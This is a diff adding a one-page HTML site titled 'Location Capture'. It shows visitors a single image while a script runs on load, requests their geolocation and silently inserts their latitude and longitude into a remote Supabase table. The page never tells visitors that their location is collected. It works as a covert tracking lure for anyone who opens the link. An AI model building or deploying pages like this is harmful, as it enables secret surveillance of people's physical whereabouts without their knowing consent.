@@ -1,0 +1,50 @@
+# index.html
+
+```html
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Location Capture</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    body {
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #fff;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://neostuffs.com/wp-content/uploads/2016/05/rastra.jpg" alt="Rastra" />
+
+  <script>
+    const supabaseUrl = 'https://jjpttsmpkscrvivzowdo.supabase.co';
+    const supabaseKey = 'sb_publishable_nbsygrIo_n-UTUNnEV5wBA_ndx8V_sF';
+    const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+
+    async function saveLocation(position) {
+      await supabase.from('locations').insert({
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        created_at: new Date().toISOString()
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(saveLocation);
+    }
+  </script>
+</body>
+</html>
+```
